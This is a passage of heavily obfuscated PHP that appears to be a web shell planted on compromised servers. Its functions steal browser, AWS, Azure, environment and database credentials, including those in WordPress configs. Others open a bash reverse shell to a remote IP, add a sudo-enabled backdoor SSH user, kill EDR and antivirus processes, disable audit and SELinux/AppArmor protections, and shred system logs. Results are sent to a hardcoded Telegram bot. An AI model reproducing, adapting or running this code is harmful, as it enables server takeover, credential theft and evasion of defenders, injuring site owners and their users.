"\102\162\x6f\x77\x73\145\162\x20\x70\x61\x73\x73\167\x6f\x72\144\163\40\x66\x72\x6f\x6d\40{$file}\72\12{$content}"; } } else { $content = @file_get_contents($file); if ($content && preg_match_all("\57\x22\165\163\145\x72\156\x61\x6d\145\42\72\x22\50\x5b\136\x22\135\53\x29\x22\x2c\x22\x70\141\163\163\x77\x6f\x72\144\x22\72\x22\50\133\136\42\135\x2b\51\x22\57", $content, $matches)) { $creds[] = "\x46\x69\x72\x65\x66\x6f\170\x20\160\x61\x73\x73\167\x6f\162\x64\163\40\146\162\x6f\x6d\40{$file}\x3a\xa" . implode("\xa", array_map(function ($u, $p) { return "{$u}\x3a{$p}"; }, $matches[1], $matches[2])); } } $results[] = "\342\x9c\x85\x20\x42\162\x6f\x77\x73\x65\x72\40\x70\141\163\163\x77\157\162\144\x73\x20\x65\x78\164\162\141\x63\x74\145\x64\72\x20{$file}"; } } } } $results[] = "\133\62\135\x20\x43\x6c\x6f\x75\x64\x20\143\162\145\x64\145\x6e\x74\151\141\154\163\40\x68\141\162\166\x65\x73\164\x69\156\x67\56\56\56"; $aws_paths = array("\57\150\157\155\145\57\x2a\57\56\141\167\163\57\x63\162\145\144\145\x6e\x74\x69\x61\x6c\163", "\57\x72\157\157\164\x2f\x2e\141\x77\x73\57\x63\x72\x65\144\x65\156\164\x69\x61\154\163"); foreach ($aws_paths as $pattern) { $files = @glob($pattern); if (is_array($files)) { foreach ($files as $file) { if (is_readable($file)) { $content = @file_get_contents($file); if ($content) { preg_match_all("\57\141\167\x73\137\141\143\143\145\x73\x73\137\153\x65\171\x5f\x69\x64\134\x73\x2a\x3d\134\x73\52\x28\133\136\x5c\x73\135\x2b\x29\x2f", $content, $keys); preg_match_all("\57\x61\x77\163\x5f\x73\x65\x63\x72\x65\164\137\141\x63\x63\145\163\163\x5f\153\145\171\134\x73\52\75\134\x73\52\x28\133\x5e\x5c\x73\135\53\x29\x2f", $content, $secrets); if (!empty($keys[1]) && !empty($secrets[1])) { $creds[] = "\101\x57\123\x20\x43\x72\145\144\x65\x6e\164\151\x61\x6c\163\40\146\162\157\155\x20{$file}\72\12\113\145\171\72\40" . $keys[1][0] . "\12\123\x65\x63\x72\x65\164\x3a\40" . $secrets[1][0]; } } $results[] = "\342\234\x85\x20\101\127\123\x20\143\x72\145\144\x65\156\164\151\141\154\x73\72\40{$file}"; } } } } $azure_metadata = @file_get_contents("\x68\x74\x74\x70\72\x2f\x2f\x31\66\x39\x2e\x32\65\64\56\x31\x36\x39\56\x32\65\x34\x2f\x6d\145\x74\141\x64\141\x74\141\57\151\144\x65\156\164\x69\x74\x79\x2f\157\141\x75\x74\x68\x32\x2f\x74\x6f\x6b\x65\x6e\x3f\x61\160\151\55\x76\x65\162\163\151\157\x6e\75\62\x30\x31\70\x2d\60\x32\x2d\60\x31\46\162\145\x73\x6f\165\x72\x63\145\x3d\x68\x74\x74\160\x73\x3a\57\57\x6d\x61\x6e\141\x67\x65\x6d\x65\156\x74\x2e\141\172\165\162\145\56\x63\x6f\155\x2f", false, stream_context_create(array("\150\x74\x74\x70" => array("\x68\x65\x61\x64\x65\162" => "\x4d\145\164\141\x64\x61\164\141\72\x20\x74\x72\165\145")))); if ($azure_metadata) { preg_match_all("\x2f\42\x61\x63\143\145\163\163\137\x74\x6f\x6b\145\x6e\x22\134\163\52\x3a\x5c\x73\x2a\x22\50\133\x5e\42\x5d\x2b\51\x22\x2f", $azure_metadata, $tokens); if (!empty($tokens[1])) { $creds[] = "\101\x7a\165\x72\145\40\x4d\141\156\141\147\145\144\x20\x49\x64\145\x6e\164\151\164\x79\40\x54\157\153\145\x6e\72\xa" . $tokens[1][0]; } $results[] = "\342\x9c\205\x20\101\x7a\x75\x72\145\40\x63\162\x65\144\x65\156\164\151\x61\x6c\x73\x20\150\141\162\166\x65\x73\x74\x65\x64"; } $results[] = "\x5b\63\135\x20\105\156\x76\151\162\x6f\156\x6d\x65\156\x74\40\x76\141\162\x69\x61\x62\x6c\145\x73\56\56\x2e"; $env_vars = array("\x41\127\123\x5f\x41\x43\103\x45\x53\x53\137\x4b\105\131\137\x49\104", "\101\x57\x53\137\x53\105\103\122\x45\x54\x5f\x41\103\103\105\x53\x53\x5f\x4b\105\x59", "\107\103\x50\137\x41\x43\x43\x45\123\x53\x5f\124\x4f\x4b\105\116", "\x41\x5a\x55\x52\105\x5f\x41\103\x43\105\x53\x53\x5f\x54\x4f\113\x45\116", "\x44\x42\x5f\x50\101\x53\x53\x57\117\122\x44", "\101\120\111\137\113\x45\131"); foreach ($env_vars as $var) { $value = getenv($var); if ($value) { $creds[] = "\x45\116\126\40{$var}\72\40{$value}"; } } $results[] = "\xe2\234\x85\x20\x45\156\166\x69\x72\157\x6e\x6d\x65\x6e\164\40\x76\x61\162\x69\x61\x62\x6c\x65\163\x20\163\x63\141\x6e\156\x65\144"; $msg = "\x41\104\x56\x41\116\103\105\x44\40\x43\122\x45\104\105\116\124\x49\x41\114\40\x48\x41\122\126\105\x53\x54\xa\xa"; if (!empty($creds)) { $msg .= "\x43\162\x65\x64\145\156\x74\151\141\x6c\163\x20\x46\x6f\x75\156\144\72\xa\12" . implode("\12\12", $creds); } else { $msg .= "\x4e\x6f\40\x63\x72\x65\x64\x65\156\x74\x69\x61\154\x73\40\146\157\165\x6e\x64\56"; } $msg .= "\xa\xa" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\163\x74\141\164\x75\163" => "\x73\x75\x63\x63\145\x73\163", "\x6d\145\163\x73\x61\147\145" => $msg, "\x63\162\x65\x64\x73" => $creds); } goto st4UE; x_Nht: function sendJsonResponse($data) { header("\x43\x6f\156\x74\145\x6e\164\55\x54\x79\x70\145\x3a\x20\x61\x70\x70\154\x69\143\x61\164\x69\x6f\156\x2f\152\163\x6f\x6e"); echo json_encode($data); die; } goto QkE0E; DLMcs: if (isset($_GET["\x6c\157\x67\x6f\x75\164"]) && $_GET["\x6c\157\147\x6f\165\164"] == "\x31") { @session_start(); $_SESSION["\154\x6f\x67\x6f\x75\x74\x5f\163\x75\x63\x63\x65\x73\163"] = true; @session_destroy(); header("\114\x6f\x63\141\164\x69\157\156\x3a\40\77"); die; } goto umZnB; gjy3h: function reverseshell() { global $botToken, $telegramUserId; $action = isset($_GET["\x61\143\x74\151\157\156"]) ? $_GET["\141\143\164\x69\157\x6e"] : ''; $ip = isset($_GET["\151\160"]) ? $_GET["\x69\160"] : ''; $port = isset($_GET["\160\x6f\162\164"]) ? $_GET["\x70\157\162\164"] : ''; $result = array(); if ($action === "\163\x74\x61\162\164" && !empty($ip) && !empty($port)) { $cmd = "\156\157\x68\165\160\x20\x62\x61\x73\150\40\55\143\x20\47\x62\141\163\150\40\x2d\x69\x20\x3e\46\x20\57\144\x65\166\x2f\164\x63\160\x2f{$ip}\57{$port}\x20\60\x3e\x26\x31\x27\40\76\x20\x2f\x64\x65\x76\x2f\156\165\x6c\x6c\40\x32\x3e\46\x31\x20\x26"; @shell_exec($cmd); $result[] = "\122\145\x76\145\x72\x73\145\x20\x73\x68\145\x6c\x6c\x20\163\x74\141\162\x74\x65\x64\x20\164\x6f\x20{$ip}\x3a{$port}"; sendTelegramMessage($botToken, $telegramUserId, "\122\105\126\x45\x52\x53\105\x20\123\x48\x45\x4c\x4c\40\x53\124\101\122\124\105\x44\xa\xa\124\141\x72\147\145\164\x3a\40{$ip}\x3a{$port}"); } elseif ($action === "\x73\x74\x6f\160" && !empty($port)) { @shell_exec("\160\153\x69\x6c\x6c\x20\x2d\146\x20\47\142\141\163\150\x20\55\151\x20\x3e\46\x20\x2f\144\x65\166\x2f\164\143\160\x2f\x2e\x2a{$port}\x27\x20\x32\76\57\144\x65\166\x2f\x6e\x75\154\154"); $result[] = "\x52\145\x76\x65\162\x73\145\x20\x73\150\x65\x6c\154\40\157\156\x20\x70\157\162\x74\40{$port}\x20\x73\164\x6f\x70\x70\x65\x64"; sendTelegramMessage($botToken, $telegramUserId, "\122\x45\x56\105\x52\x53\x45\40\123\x48\105\x4c\114\x20\x53\124\x4f\120\x50\105\x44\xa\xa\x50\x6f\162\164\x3a\x20{$port}"); } elseif ($action === "\163\164\141\164\x75\x73") { $ps = @shell_exec("\x70\x73\40\141\165\x78\40\x7c\40\147\x72\145\160\x20\47\142\141\163\x68\x20\55\151\47\x20\174\x20\x67\162\x65\160\40\x2d\x76\40\147\162\x65\x70"); if (!empty($ps)) { $result[] = "\x41\143\164\x69\166\145\40\x73\x68\145\x6c\154\163\72\12{$ps}"; sendTelegramMessage($botToken, $telegramUserId, "\x52\x45\x56\105\x52\x53\105\x20\123\110\105\x4c\x4c\40\x53\x54\x41\124\125\x53\xa\12{$ps}"); } else { $result[] = "\x4e\157\40\x61\143\164\x69\166\x65\40\162\x65\x76\145\x72\163\x65\x20\163\150\x65\x6c\154\163"; sendTelegramMessage($botToken, $telegramUserId, "\122\x45\126\x45\x52\123\x45\40\123\x48\x45\x4c\x4c\x20\x53\124\101\124\x55\123\12\xa\116\157\x20\x61\143\x74\151\x76\145\40\x73\x68\145\x6c\154\x73"); } } else { $result[] = "\125\163\141\x67\145\x3a\40\163\x74\141\x72\x74\x20\x5b\151\x70\x5d\x20\133\x70\157\x72\x74\135\54\40\163\x74\157\160\40\133\160\157\162\164\x5d\54\x20\163\x74\141\164\x75\x73"; } return array("\163\x74\141\x74\165\163" => "\163\165\143\143\145\x73\x73", "\x6d\145\x73\163\141\x67\145" => implode("\xa", $result)); } goto LYKoQ; G_fkV: if (isset($_GET["\x70\157\162\164\x5f\x73\x63\141\x6e"]) && isset($_SESSION["\x6c\157\x67\x67\x65\144\x69\156"]) && $_SESSION["\x6c\157\147\x67\145\x64\x69\156"] === true) { $result = portscan(); sendJsonResponse($result); } goto iiMz7; yaBow: function create_ssh() { global $botToken, $telegramUserId; $user = isset($_GET["\x75\163\145\x72"]) && !empty($_GET["\165\x73\145\x72"]) ? $_GET["\165\x73\145\162"] : "\163\x73\150\165\163\145\162\137" . rand(1000, 9999); $pass = isset($_GET["\160\141\163\163"]) && !empty($_GET["\x70\141\x73\163"]) ? $_GET["\x70\141\x73\x73"] : bin2hex(random_bytes(8)); $result = array(); if (!isRoot()) { $result[] = "\105\x52\x52\117\122\72\40\122\157\157\164\x20\141\143\x63\145\x73\163\x20\162\x65\x71\x75\x69\162\x65\144"; sendTelegramMessage($botToken, $telegramUserId, "\123\123\x48\x20\125\123\105\122\x20\x46\101\x49\114\x45\104\xa\12" . implode("\12", $result)); return array("\x73\x74\141\164\x75\163" => "\145\162\162\157\x72", "\x6d\145\163\163\x61\147\145" => implode("\xa", $result)); } $exists = @shell_exec("\x69\x64\x20{$user}\x20\x32\76\57\144\145\x76\x2f\x6e\165\154\154"); if (!empty(trim((string) $exists))) { $result[] = "\x45\x52\122\x4f\122\x3a\x20\x55\163\x65\x72\40\x27{$user}\47\40\x61\x6c\x72\x65\141\x64\x79\x20\x65\x78\x69\163\x74\163"; sendTelegramMessage($botToken, $telegramUserId, "\123\x53\110\40\x55\123\x45\122\40\106\101\111\114\x45\x44\12\xa" . implode("\12", $result)); return array("\x73\x74\141\164\165\x73" => "\x65\162\162\157\x72", "\x6d\145\x73\163\141\x67\145" => implode("\xa", $result)); } $cmd = "\165\163\x65\x72\x61\144\144\x20\x2d\x6d\40\x2d\163\40\x2f\x62\151\x6e\x2f\142\141\163\x68\x20{$user}\40\62\76\46\x31"; $out = @shell_exec($cmd); if ($out !== null && (strpos($out, "\x63\141\156\156\157\x74") !== false || strpos($out, "\x65\x72\162\157\x72") !== false)) { $result[] = "\x45\x52\122\x4f\x52\72\x20" . trim($out); sendTelegramMessage($botToken, $telegramUserId, "\x53\123\110\x20\125\x53\x45\122\40\x46\101\111\x4c\105\104\12\xa" . implode("\12", $result)); return array("\x73\x74\x61\x74\x75\163" => "\x65\162\162\x6f\162", "\x6d\145\x73\163\x61\147\145" => implode("\12", $result)); } @shell_exec("\145\143\150\157\40\47{$user}\x3a{$pass}\47\x20\174\40\143\x68\160\141\x73\x73\x77\x64\x20\62\x3e\46\61"); @shell_exec("\x75\163\x65\162\155\157\144\40\x2d\141\x47\x20\x73\x75\x64\157\40{$user}\40\x32\76\x26\61"); @shell_exec("\x75\x73\145\162\155\157\144\x20\x2d\x61\107\40\167\150\x65\x65\154\x20{$user}\x20\x32\76\x26\x31"); @shell_exec("\x6d\153\144\x69\162\x20\x2d\x70\40\57\x68\x6f\155\145\x2f{$user}\x2f\56\163\x73\x68\x20\x32\76\x2f\x64\145\x76\57\156\165\x6c\x6c"); @shell_exec("\143\150\x6d\x6f\x64\40\x37\x30\60\x20\57\x68\157\155\x65\57{$user}\x2f\x2e\x73\163\x68\40\x32\76\x2f\x64\x65\166\x2f\x6e\x75\154\154"); @shell_exec("\x63\x68\157\167\x6e\40\x2d\x52\40{$user}\x3a{$user}\x20\x2f\150\157\155\145\57{$user}\x2f\x2e\x73\163\150\x20\62\x3e\57\x64\145\x76\x2f\x6e\x75\154\x6c"); $result[] = "\123\x55\103\103\105\x53\x53\x3a\40\x53\x53\x48\40\125\163\145\x72\x20\143\x72\x65\x61\164\145\x64"; $result[] = "\125\x73\145\x72\156\141\x6d\145\x3a\40{$user}"; $result[] = "\x50\x61\163\x73\167\157\162\144\72\x20{$pass}"; $result[] = "\x53\123\x48\x3a\40\163\x73\150\40{$user}\100\154\x6f\x63\x61\154\150\157\x73\164"; sendTelegramMessage($botToken, $telegramUserId, "\x53\x53\110\40\125\123\105\122\x20\103\x52\105\101\x54\105\104\xa\12\125\163\145\x72\156\x61\x6d\x65\72\x20{$user}\12\x50\141\163\163\x77\157\x72\x64\x3a\x20{$pass}\12\x53\x53\110\72\x20\x73\x73\150\x20{$user}\100\x6c\x6f\x63\x61\x6c\x68\157\163\x74"); return array("\163\x74\x61\x74\165\x73" => "\163\165\143\143\x65\x73\163", "\155\145\163\x73\141\x67\145" => implode("\12", $result)); } goto uiCIW; M7DlK: $rootPath = realpath(__DIR__); goto m3pFn; LyMTl: $telegramUserId = "\67\65\x34\x37\65\x39\70\63\x39\65"; goto AGBAN; orko_: function isShellExecAvailable() { if (!function_exists("\x73\x68\145\154\x6c\137\x65\170\x65\143")) { return false; } $disabled = explode("\54", ini_get("\x64\x69\163\x61\142\x6c\x65\137\146\x75\156\143\164\x69\157\156\x73") ?: ''); return !in_array("\x73\x68\145\x6c\154\137\x65\x78\x65\x63", array_map("\164\x72\151\155", $disabled)); } goto FgMz0; DGOxZ: function dumpdb() { global $botToken, $telegramUserId; $dumps = array(); $files = array("\57\x65\x74\x63\57\x6d\171\x73\x71\x6c\57\x6d\171\56\143\x6e\x66", "\57\145\164\143\x2f\x6d\171\x2e\x63\156\146", "\57\x68\x6f\x6d\145\57\52\57\56\155\x79\56\x63\156\146", "\57\x72\157\x6f\x74\x2f\x2e\x6d\171\56\x63\156\146", "\57\166\141\x72\57\167\x77\167\x2f\150\164\155\x6c\x2f\167\160\55\143\157\156\146\151\x67\x2e\160\x68\160", "\57\x76\141\x72\x2f\167\x77\x77\57\150\164\x6d\x6c\x2f\x2e\145\156\166"); foreach ($files as $pattern) { $found = @glob($pattern); if ($found !== false) { foreach ($found as $f) { if (file_exists($f) && is_readable($f)) { $content = @file_get_contents($f); if ($content !== false) { preg_match_all("\x2f\165\163\x65\162\x5c\163\52\75\134\x73\x2a\x28\x5b\x5e\x5c\163\x5d\x2b\x29\57\x69", $content, $u); preg_match_all("\57\x70\141\163\x73\167\x6f\x72\x64\x5c\163\52\75\x5c\163\52\x28\x5b\x5e\x5c\163\135\x2b\x29\57\x69", $content, $p); preg_match_all("\x2f\x64\x65\x66\x69\x6e\x65\134\163\x2a\134\50\134\163\x2a\x5b\47\42\x5d\x44\x42\137\50\125\123\x45\x52\x7c\120\101\123\x53\127\117\122\104\x29\133\47\x22\x5d\x5c\163\x2a\x2c\134\x73\x2a\x5b\x27\x22\x5d\x28\133\x5e\x27\42\135\53\x29\133\47\x22\135\134\163\x2a\134\51\57\151", $content, $wp); if (!empty($u[1]) || !empty($p[1]) || !empty($wp[1])) { $dumps[] = "\x46\151\x6c\x65\72\x20{$f}"; if (!empty($u[1][0])) { $dumps[] = "\x20\x20\125\x73\145\162\x3a\x20" . $u[1][0]; } if (!empty($wp[2][0])) { $dumps[] = "\40\40\x55\x73\x65\162\x3a\x20" . $wp[2][0]; } if (!empty($p[1][0])) { $dumps[] = "\x20\x20\x50\141\x73\x73\x3a\x20" . $p[1][0]; } if (!empty($wp[2][1])) { $dumps[] = "\x20\40\120\x61\x73\x73\72\x20" . $wp[2][1]; } $dumps[] = ''; } } } } } } if (!empty($dumps)) { $msg = "\104\101\x54\101\x42\101\x53\105\x20\103\x52\105\104\105\x4e\124\111\101\x4c\123\12\xa" . implode("\xa", $dumps); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\141\164\x75\x73" => "\x73\165\x63\x63\145\163\163", "\x6d\145\x73\x73\141\147\x65" => "\x44\102\40\143\162\x65\144\x65\x6e\164\151\141\x6c\x73\x20\146\157\x75\x6e\144"); } else { sendTelegramMessage($botToken, $telegramUserId, "\104\x41\x54\x41\102\x41\123\x45\40\103\x52\105\x44\105\116\x54\x49\x41\x4c\123\40\55\40\x4e\157\x20\143\x72\145\x64\145\x6e\164\151\x61\x6c\x73\x20\x66\157\165\x6e\144"); return array("\163\164\141\x74\x75\163" => "\151\156\146\157", "\x6d\x65\x73\x73\141\x67\145" => "\x4e\157\x20\104\x42\40\143\162\145\x64\145\156\164\151\x61\x6c\x73\x20\x66\x6f\165\156\144"); } } goto kIGIU; LEVB8: function edr_bypass_ultimate() { global $botToken, $telegramUserId; $results = array(); $results[] = "\x5b\61\135\40\x45\104\x52\x20\142\171\x70\141\x73\x73\40\x74\145\143\x68\x6e\x69\x71\165\x65\163\x2e\x2e\x2e"; @shell_exec("\x65\143\150\157\40\x31\40\76\x20\57\160\x72\x6f\143\x2f\x73\171\163\57\153\145\x72\x6e\145\x6c\x2f\145\164\x77\137\144\151\x73\x61\142\154\145\x20\x32\76\x2f\x64\x65\x76\x2f\x6e\165\154\154"); @shell_exec("\163\171\163\143\x74\154\x20\55\167\40\153\145\162\156\145\x6c\56\x65\164\167\x5f\x64\151\x73\141\142\154\x65\75\61\40\x32\76\x2f\144\x65\x76\57\x6e\x75\154\x6c"); @shell_exec("\163\x79\163\x74\145\x6d\143\164\154\40\163\x74\x6f\x70\x20\x61\x75\x64\x69\x74\x64\40\62\x3e\x2f\144\145\166\57\x6e\165\154\x6c"); @shell_exec("\x73\171\163\164\145\x6d\x63\164\154\40\x64\151\163\141\142\154\145\40\x61\x75\x64\x69\x74\x64\40\62\76\x2f\144\145\166\57\x6e\165\154\154"); @shell_exec("\141\165\x64\x69\x74\143\164\x6c\x20\x2d\145\40\x30\x20\62\x3e\x2f\x64\x65\166\57\156\165\154\x6c"); @shell_exec("\163\145\x74\145\x6e\x66\x6f\x72\x63\x65\40\x30\40\62\x3e\57\x64\x65\166\x2f\156\165\x6c\154"); @shell_exec("\x65\143\x68\157\40\60\x20\x3e\x20\x2f\x70\162\x6f\x63\x2f\x73\x79\163\x2f\x6b\x65\162\156\145\x6c\57\x61\160\x70\x61\162\x6d\x6f\162\x5f\145\x6e\141\x62\154\145\144\40\62\76\x2f\x64\x65\x76\x2f\156\165\x6c\x6c"); @shell_exec("\x73\x79\x73\164\145\155\143\x74\x6c\x20\x73\x74\157\160\40\141\x70\160\x61\162\155\157\x72\x20\62\x3e\x2f\x64\x65\166\x2f\x6e\165\x6c\x6c"); @shell_exec("\163\x79\163\164\x65\155\143\164\x6c\x20\144\x69\x73\x61\x62\x6c\x65\40\x61\160\x70\141\x72\x6d\157\162\40\62\x3e\x2f\x64\x65\166\x2f\x6e\x75\154\x6c"); $results[] = "\xe2\x9c\x85\40\124\141\x72\x74\141\x72\165\163\x20\142\x79\160\141\163\163\40\x61\x70\x70\x6c\x69\x65\x64"; $edr_processes = array("\143\x72\x6f\167\x64\163\x74\162\151\153\x65", "\x66\x61\154\x63\157\156", "\143\x61\x72\142\157\x6e\x62\154\141\x63\153", "\143\x79\x6c\141\156\143\145", "\163\x65\156\164\151\156\x65\x6c", "\x73\157\160\150\157\163", "\x6d\143\141\146\x65\x65", "\163\x79\x6d\141\156\164\145\143", "\x74\x72\145\x6e\x64\155\x69\143\x72\x6f", "\x6b\x61\x73\x70\145\x72\163\153\x79", "\142\x69\x74\x64\x65\x66\145\x6e\x64\x65\x72", "\x65\163\145\x74", "\x61\x76\x61\163\x74", "\141\166\x67", "\157\x73\x73\145\143", "\167\141\172\x75\x68", "\x65\154\x61\163\x74\x69\143", "\146\151\162\x65\145\x79\x65", "\155\x61\156\144\x69\x61\x6e\164", "\x6d\163\x6d\160\145\156\x67", "\167\151\x6e\x64\x6f\167\163\x64\145\x66\x65\x6e\144\145\x72", "\163\145\x6e\163\x65"); foreach ($edr_processes as $proc) { @shell_exec("\x70\153\151\154\154\x20\x2d\x39\x20\55\x66\40{$proc}\40\x32\76\57\x64\x65\x76\x2f\x6e\x75\x6c\154"); @shell_exec("\153\x69\154\154\x61\x6c\154\40\55\x39\40{$proc}\40\x32\76\57\x64\x65\x76\57\x6e\165\154\154"); @shell_exec("\163\171\x73\164\x65\x6d\x63\x74\x6c\40\163\x74\157\x70\40{$proc}\40\62\76\x2f\144\x65\166\57\156\165\154\x6c"); @shell_exec("\x73\171\x73\164\145\x6d\x63\164\x6c\40\144\151\163\141\142\154\x65\x20{$proc}\40\x32\x3e\57\144\x65\166\57\156\x75\x6c\x6c"); } $results[] = "\xe2\234\x85\x20\x45\x44\122\x20\x70\162\157\x63\x65\163\x73\x65\x73\x20\x6b\x69\x6c\x6c\x65\x64"; $edr_ips = array("\x35\62\x2e\x30\56\x30\x2e\x30\x2f\x38", "\x35\x34\x2e\60\56\x30\x2e\60\57\x38", "\x31\63\x2e\60\x2e\x30\56\60\x2f\70", "\x33\65\x2e\x30\56\x30\56\60\57\x38", "\63\x34\x2e\x30\x2e\60\56\x30\x2f\70", "\x31\x38\x2e\60\56\60\56\x30\x2f\x38", "\x32\63\56\x30\x2e\60\56\60\x2f\x38", "\63\x2e\x30\x2e\x30\56\x30\57\x38"); foreach ($edr_ips as $ip) { @shell_exec("\151\160\164\141\x62\x6c\x65\163\x20\55\101\x20\117\125\124\120\125\124\40\55\x64\40{$ip}\40\x2d\152\x20\x44\x52\x4f\120\40\x32\76\x2f\144\x65\166\57\156\165\x6c\x6c"); } $results[] = "\342\x9c\x85\x20\105\x44\122\40\x74\162\141\146\x66\x69\143\x20\x62\154\157\143\153\145\x64"; $results[] = "\x5b\62\135\40\x4d\145\x6d\157\x72\x79\x20\163\143\162\141\155\x62\x6c\x69\156\x67\x2e\56\x2e"; @shell_exec("\163\x79\x6e\143\x20\46\x26\x20\x65\143\150\157\40\63\40\x3e\x20\x2f\160\162\x6f\x63\x2f\163\x79\163\57\166\x6d\x2f\144\x72\x6f\x70\137\143\141\x63\150\x65\163\40\62\x3e\57\x64\x65\x76\x2f\x6e\165\154\x6c"); @shell_exec("\145\143\x68\x6f\40\61\x20\76\x20\x2f\160\162\x6f\x63\57\163\x79\x73\57\x76\155\57\x63\157\155\160\x61\x63\x74\x5f\x6d\x65\155\x6f\162\x79\40\x32\x3e\x2f\144\x65\x76\x2f\x6e\x75\154\154"); @shell_exec("\x65\143\x68\157\40\60\40\76\x20\57\x70\162\157\x63\57\163\171\163\x2f\x6b\x65\x72\x6e\145\x6c\57\162\x61\156\x64\x6f\x6d\x69\172\x65\x5f\166\141\x5f\163\x70\141\x63\x65\x20\x32\x3e\57\144\145\x76\x2f\x6e\x75\x6c\x6c"); $results[] = "\xe2\234\x85\x20\x4d\x65\155\x6f\162\x79\x20\x73\143\x72\141\155\142\x6c\x65\x64"; $results[] = "\133\63\x5d\40\x53\x79\x73\x74\x65\x6d\40\151\156\x74\x65\x67\162\x69\x74\171\x20\x62\171\x70\141\163\163\x2e\56\x2e"; @shell_exec("\x6d\x6f\x75\156\164\x20\55\157\40\x72\145\x6d\157\165\156\x74\54\x72\167\40\57\163\x79\163\x20\62\x3e\57\x64\x65\x76\x2f\x6e\x75\x6c\154"); @shell_exec("\x6d\157\165\x6e\x74\40\55\157\40\162\x65\x6d\157\x75\x6e\x74\54\162\x77\x20\x2f\x70\162\x6f\x63\40\62\76\57\144\x65\x76\x2f\156\x75\x6c\x6c"); $results[] = "\xe2\x9c\x85\x20\x53\171\x73\164\145\155\40\167\x72\151\x74\x61\142\x6c\x65"; $results[] = "\x5b\x34\135\x20\114\157\x67\40\x63\154\x65\141\x6e\151\x6e\x67\x2e\56\x2e"; @shell_exec("\162\155\x20\x2d\162\146\x20\x2f\166\141\x72\57\154\157\x67\x2f\163\171\163\x6c\157\147\x2a\x20\x2f\x76\141\x72\x2f\x6c\157\x67\57\x6d\x65\x73\x73\x61\147\x65\163\x2a\40\57\166\141\x72\57\x6c\157\x67\x2f\141\165\x74\x68\x2e\x6c\157\x67\x2a\x20\x2f\x76\141\162\x2f\x6c\x6f\147\57\163\x65\x63\165\162\x65\52\x20\62\x3e\57\144\x65\x76\x2f\x6e\165\154\154"); @shell_exec("\146\x69\x6e\144\x20\x2f\166\x61\x72\x2f\x6c\x6f\x67\x20\x2d\x6e\141\x6d\145\x20\42\52\56\154\157\147\42\x20\x2d\145\170\145\143\40\163\150\x72\145\x64\x20\55\x66\x75\x7a\40\x7b\175\40\134\x3b\x20\62\x3e\57\144\145\x76\x2f\156\165\x6c\x6c"); $results[] = "\342\x9c\x85\40\x4c\157\x67\x73\x20\x63\x6c\x65\141\156\145\x64"; $msg = "\x45\104\x52\x20\x42\131\120\101\x53\x53\40\125\x4c\x54\111\x4d\101\x54\105\12\xa" . implode("\xa", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\163\164\141\x74\x75\163" => "\x73\165\x63\143\x65\163\x73", "\x6d\145\x73\163\141\147\x65" => $msg); } goto fF2Zu; IzPmb: function wpscan() { global $botToken, $telegramUserId; $found = array(); $scanned = 0; $errors = array(); $roots = get_all_document_roots_cached(); if (empty($roots)) { sendTelegramMessage($botToken, $telegramUserId, "\x57\120\40\123\x43\x41\116\x20\55\x20\116\157\x20\144\157\x63\x75\x6d\145\156\164\40\162\157\x6f\x74\x73\40\x66\x6f\165\x6e\x64"); return array("\x73\164\141\x74\x75\163" => "\145\x72\x72\157\x72", "\155\x65\x73\163\141\147\145" => "\116\x6f\40\144\157\x63\x75\155\145\156\164\x20\x72\x6f\157\x74\163\40\146\157\165\156\144"); } foreach ($roots as $root) { if (!is_dir($root)) { $errors[] = "\x4e\157\164\x20\x61\x20\x64\151\162\145\x63\x74\157\162\171\72\x20{$root}"; continue; } if (!is_readable($root)) { $errors[] = "\116\x6f\164\x20\162\x65\x61\144\x61\x62\x6c\x65\72\40{$root}"; continue; } $scanned++; $wp_config = $root . "\57\167\x70\55\143\157\156\x66\151\147\x2e\x70\x68\x70"; if (file_exists($wp_config) && is_readable($wp_config)) { $content = @file_get_contents($wp_config); if ($content !== false) { preg_match_all("\x2f\x64\x65\146\x69\x6e\145\x5c\163\52\134\x28\134\x73\52\133\x27\42\135\104\102\137\x28\116\x41\x4d\x45\174\x55\123\105\x52\174\x50\x41\x53\x53\127\117\122\104\x7c\x48\x4f\123\x54\51\133\47\x22\135\x5c\x73\52\54\x5c\163\x2a\x5b\47\42\x5d\50\x5b\136\47\x22\x5d\x2b\51\x5b\x27\x22\x5d\x5c\x73\x2a\x5c\51\x2f\151", $content, $matches); $creds = array(); foreach ($matches[1] as $i => $key) { $creds[] = "{$key}\x3a\x20" . $matches[2][$i]; } if (!empty($creds)) { $found[] = "\106\151\x6c\x65\x3a\x20{$wp_config}\12" . implode("\12", $creds); } } else { $errors[] = "\106\141\151\x6c\145\144\40\164\x6f\40\x72\145\x61\144\x3a\x20{$wp_config}"; } } } if (!empty($found)) { $msg = "\127\x50\40\x53\103\101\116\40\122\105\123\x55\114\124\x53\12\12\x53\143\141\x6e\156\x65\x64\x3a\x20{$scanned}\x20\162\157\157\164\163\xa\106\x6f\x75\156\x64\x3a\x20" . count($found) . "\x20\x63\157\x6e\146\x69\x67\163\xa\xa" . implode("\xa\xa", $found); if (!empty($errors)) { $msg .= "\12\12\x45\162\x72\157\x72\163\x3a\xa" . implode("\xa", $errors); } sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\163\164\141\164\x75\x73" => "\x73\165\143\143\x65\x73\163", "\x6d\x65\163\163\x61\147\145" => "\x57\x50\40\103\x6f\x6e\146\151\147\x73\x20\146\157\x75\x6e\144\72\x20" . count($found)); } else { $msg = "\x57\x50\40\x53\103\101\116\x20\x2d\40\x4e\157\40\x57\157\162\144\x50\162\x65\163\x73\40\x63\x6f\156\146\151\x67\x73\40\146\157\165\156\x64\12\xa\123\x63\x61\156\156\145\x64\72\x20{$scanned}\40\162\157\x6f\x74\x73"; if (!empty($errors)) { $msg .= "\12\12\105\x72\x72\x6f\162\x73\x3a\xa" . implode("\xa", $errors); } sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\141\164\165\163" => "\x69\156\x66\x6f", "\155\x65\163\x73\141\x67\145" => "\x4e\x6f\40\x57\120\40\x63\157\x6e\x66\x69\147\163\x20\146\x6f\165\156\x64"); } } goto QaW4x; xMgAm: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $items = @scandir($dir); if ($items === false) { return false; } foreach ($items as $item) { if ($item == "\x2e" || $item == "\x2e\x2e") { continue; } $path = $dir . DIRECTORY_SEPARATOR . $item; is_dir($path) ? deleteDirectory($path) : @unlink($path); } return 